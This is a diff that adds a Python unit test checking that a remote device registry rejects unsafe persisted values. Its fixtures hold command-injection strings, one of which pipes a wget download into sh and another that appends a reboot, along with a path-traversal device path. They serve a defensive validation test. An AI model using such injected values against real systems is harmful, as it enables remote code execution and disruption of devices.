@@ -68,6 +68,17 @@ class RemoteRegistryTests(unittest.TestCase):
                 self.assertNotIn("key_path", public)
                 self.assertNotIn("user", public)
 
+    def test_a_persisted_device_and_iface_are_held_to_the_api_shapes(self) -> None:
+        """duts.json is the weaker gate otherwise, and both values reach a shell."""
+        for bad in (
+            {**REMOTE, "device": "/tmp/x ; wget http://host/x -O- | sh"},
+            {**REMOTE, "device": "/dev/../tmp/x"},
+            {**REMOTE, "backhaul_iface": "ath0; reboot"},
+        ):
+            with self.subTest(device=bad["device"], iface=bad["backhaul_iface"]):
+                self.assertIsNone(registry_mod._clean_remote(bad))
+        self.assertEqual(registry_mod._clean_remote(dict(REMOTE)), REMOTE)
+
     def test_load_persisted_merges_and_never_clears_a_live_remote(self) -> None:
         """A saved entry from before the node had an SSH console must not wipe it."""
         with tempfile.TemporaryDirectory() as directory:
